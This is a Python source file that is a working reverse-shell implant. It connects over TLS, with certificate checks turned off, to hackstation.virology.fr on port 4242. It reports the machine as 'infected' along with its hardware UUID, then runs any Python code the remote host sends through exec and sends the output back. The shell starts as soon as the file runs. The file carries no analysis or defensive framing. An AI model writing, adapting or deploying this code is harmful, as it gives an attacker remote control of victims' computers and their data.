import socket
import ssl
import sys
import threading
from io import StringIO
import contextlib
import os

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

def execute_command(command, socket):
    """Executes a command in a separate thread and sends output back through the socket."""
    with stdoutIO() as o:
        try:
            exec(command)
        except Exception as e:
            print(str(e))  # Capture the exception output
        output = o.getvalue()
    socket.send(output.encode('utf-8'))

def revshell():
    context = ssl.create_default_context()

    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s = context.wrap_socket(raw_socket, server_hostname="hackstation.virology.fr")

    s.connect(("hackstation.virology.fr", 4242))
    uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
    s.send(f"infected|||{uid}|||".encode('utf-8'))

    while True:
        command = ""
        while True:
            part = s.recv(1024).decode('utf-8')
            command += part
            if len(part) < 1024:
                break

        if command.lower() == "exit":
            break
        else:
            thread = threading.Thread(target=execute_command, args=(command, s))
            thread.start()

    s.close()

revshell()
